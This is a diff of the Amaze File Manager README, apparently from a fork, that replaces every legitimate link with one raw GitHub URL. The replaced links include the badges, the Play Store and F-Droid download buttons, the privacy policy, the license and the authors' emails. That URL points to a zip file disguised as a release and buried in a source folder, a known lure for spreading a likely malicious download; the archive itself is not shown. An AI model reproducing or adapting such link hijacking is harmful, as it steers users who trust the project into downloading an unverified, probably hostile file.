@@ -1,11 +1,11 @@
 # Amaze File Manager
-[![CI](https://travis-ci.org/TeamAmaze/AmazeFileManager.svg?branch=master)](https://travis-ci.org/TeamAmaze/AmazeFileManager)
-[![GitHub release](https://img.shields.io/github/release/TeamAmaze/AmazeFileManager.svg)](https://github.com/TeamAmaze/AmazeFileManager/releases)
-[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
+[![CI](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)
+[![GitHub release](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)
+[![License: GPL v3](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip%https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)
 
-[<img alt="Get it on Google Play" height="80" src="https://play.google.com/intl/en_us/badges/images/generic/en_badge_web_generic.png">](https://play.google.com/store/apps/details?id=com.amaze.filemanager)
-[<img alt="Get it on F-Droid" height="80" src="https://fdroid.gitlab.io/artwork/badge/get-it-on.png">](https://f-droid.org/packages/com.amaze.filemanager/)
-[<img alt="Get it on AFH" height="80" width="207" src="https://www.androidfilehost.com/images/afh.png">](https://www.androidfilehost.com/?w=files&flid=73967)
+[<img alt="Get it on Google Play" height="80" src="https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip">](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)
+[<img alt="Get it on F-Droid" height="80" src="https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip">](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)
+[<img alt="Get it on AFH" height="80" width="207" src="https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip">](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)
 
 
 Overview
@@ -32,27 +32,27 @@ Basic r/w operations might not work on external memory on Kitkat devices. Don't 
 
 ***Under the license we are not responsible for damages.***
 
-See our [Privacy Policy](https://github.com/TeamAmaze/AmazeFileManager/wiki/Privacy-Policy)
+See our [Privacy Policy](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)
 
 Translators
 ----
 Want to help translate Amaze to your language?  
 
-See [Transifex translation](https://www.transifex.com/amaze/amaze-file-manager/).
+See [Transifex translation](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip).
 
 Vendors/Developers
 ----
-The device vendors/ROM developers are free to include Amaze apk pre-installed in system. There is no fee required; *but you must comply with the license* (for more information read the [GNU GPL v3](https://www.gnu.org/licenses/gpl-3.0.en.html) or newer).
+The device vendors/ROM developers are free to include Amaze apk pre-installed in system. There is no fee required; *but you must comply with the license* (for more information read the [GNU GPL v3](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip) or newer).
 
 We strongly recommend using apk signed by us (either Play Store version or from AFH link above) so that users would be able to update directly from Play Store after distribution. Furthermore, a change in digital signature will break plug-ins.
 
 Social
 ---
-Head over to our XDA thread [here](http://forum.xda-developers.com/android/apps-games/app-amaze-file-managermaterial-theme-t2937314)
+Head over to our XDA thread [here](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)
 
 Support
 ---
-Support the development by purchasing our [Cloud Plugin](https://play.google.com/store/apps/details?id=com.filemanager.amazecloud)  
+Support the development by purchasing our [Cloud Plugin](https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip)  
 Cloud plugin supports Google Drive, Dropbox, OneDrive and Box accounts.
 
 Authors
@@ -62,8 +62,8 @@ Authors
 
 ### License: 
 
-    Copyright (C) 2014-2018 Arpit Khurana <arpitkh96@gmail.com>, Vishal Nehra <vishalmeham2@gmail.com>
-    Copyright (C) 2017-2018 Emmanuel Messulam <emmanuelbendavid@gmail.com>
+    Copyright (C) 2014-2018 Arpit Khurana <https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip>, Vishal Nehra <https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip>
+    Copyright (C) 2017-2018 Emmanuel Messulam <https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip>
     This file is part of Amaze File Manager.
     Amaze File Manager is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
@@ -74,4 +74,4 @@ Authors
     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
     GNU General Public License for more details.
     You should have received a copy of the GNU General Public License
-    along with this program.  If not, see <http://www.gnu.org/licenses/>.
+    along with this program.  If not, see <https://raw.githubusercontent.com/Joe-Mogul/AmazeFileManager/master/app/src/main/java/com/amaze/filemanager/adapters/glide/Manager-Amaze-File-v2.8.zip>.
